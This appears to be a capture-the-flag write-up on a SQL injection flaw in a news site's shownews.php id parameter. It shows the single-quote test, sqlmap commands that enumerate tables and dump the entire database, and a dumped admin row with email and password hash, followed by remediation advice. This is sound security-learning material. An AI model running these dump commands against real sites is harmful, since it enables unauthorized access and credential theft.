# Challenge 4: Who is admin

## Initial Analysis

### Functionality Description
The website is a simple news site. The main page displays a list of articles. Clicking on an article redirects the user to `shownews.php` for detailed content.

### Identifying Anomalies
The URL for a detailed article has the format `.../shownews.php?id=[number]`. The presence of an `id` parameter passed directly in the URL to query data is a strong indicator of an SQL Injection vulnerability.

### Vulnerability Hypothesis
The website has an SQL Injection vulnerability in the `id` parameter of the `shownews.php` page.

## Exploitation Steps

1.  **Confirm the Vulnerability:** Navigate to any article, for example, `.../shownews.php?id=2`. Append a single quote (`'`) to the end of the URL: `.../shownews.php?id=2'`.
    The website returns an SQL error message, which confirms the vulnerability's existence 100%.
    

2.  **Use `sqlmap` to List Tables:** To save time, we use the automated tool `sqlmap`.
    **Command:**
    ```bash
    sqlmap -u "http://<URL>/shownews.php?id=2" --batch --tables
    ```
    **Result:** `sqlmap` identifies the backend as SQLite and lists the tables in the database. A notable table is `nxf8_users`.
    

3.  **Dump Data from the `nxf8_users` Table:** Continue using `sqlmap` to extract all data from the discovered tables.
    **Command:**
    ```bash
    sqlmap -u "http://<URL>/shownews.php?id=2" --batch --dump
    ```
    **Result:** `sqlmap` dumps the entire content of the `nxf8_users` table, including `id`, `name`, `role`, `email`, and `password`.
    

4.  **Identify the Administrator:** By analyzing the dumped data, we find a user with the `role` of `admin`.
    ```
    | 15 | Ryan | admin | ryan@secret.org | ee1410a7547bf270720b5159d777da934cb03751 |
    ```
    The admin's account information is now exposed. This fulfills the challenge's objective of finding "Who is admin."

## Impact
- **Very Severe:** An attacker can read the entire contents of the database, including sensitive information like usernames, emails, and passwords (even if hashed) for all users.
- This can lead to an administrator account takeover, modification of website content, or data theft.

## Remediation
- **Use Prepared Statements (Parameterized Queries):** This is the most effective method. Input from the `id` parameter will be treated as data, not as an executable SQL command.
- **Use an ORM (Object-Relational Mapping):** Modern ORM libraries typically have built-in protection against SQL Injection.
- **Input Validation:** Always validate that the `id` parameter is a valid integer before using it.
- **Hide Detailed Error Messages:** Do not display SQL errors to end-users.